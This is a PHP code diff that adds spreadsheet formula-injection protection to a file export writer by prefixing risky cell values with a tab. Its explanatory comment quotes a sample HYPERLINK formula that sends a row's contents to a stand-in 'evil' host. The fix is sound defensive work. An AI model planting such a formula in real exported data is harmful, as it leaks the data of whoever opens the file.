@@ -45,6 +45,12 @@ class FileWriter
      */
     public function writeRow(array $row): void
     {
+        // PDF output is rendered as escaped HTML, never evaluated as a formula,
+        // so it keeps the values verbatim.
+        if ($this->format !== 'pdf') {
+            $row = array_map($this->neutralizeFormula(...), $row);
+        }
+
         if ($this->format === 'csv') {
             // Empty escape keeps RFC-4180 quoting and satisfies PHP 8.4+ deprecation.
             fputcsv($this->handle, $row, ',', '"', '');
@@ -53,6 +59,29 @@ class FileWriter
         }
 
         $this->buffer[] = $row;
+    }
+
+    /**
+     * Defuse spreadsheet formula injection (CSV injection).
+     *
+     * A cell whose text begins with `=`, `+`, `-`, `@` or a control character is
+     * evaluated as a formula by Excel, LibreOffice and Sheets — so exported user
+     * content like `=HYPERLINK("https://evil/?"&A1,"click")` would exfiltrate the
+     * row to whoever opens the file. PhpSpreadsheet makes it worse for XLSX: its
+     * DefaultValueBinder types a leading `=` string as an actual formula cell.
+     *
+     * Prefixing with a tab keeps the value readable and copy-pasteable while
+     * forcing it to be treated as text.
+     */
+    private function neutralizeFormula(mixed $value): mixed
+    {
+        if (! is_string($value) || $value === '') {
+            return $value;
+        }
+
+        return in_array($value[0], ['=', '+', '-', '@', "\t", "\r"], true)
+            ? "\t".$value
+            : $value;
     }
 
     public function close(): void
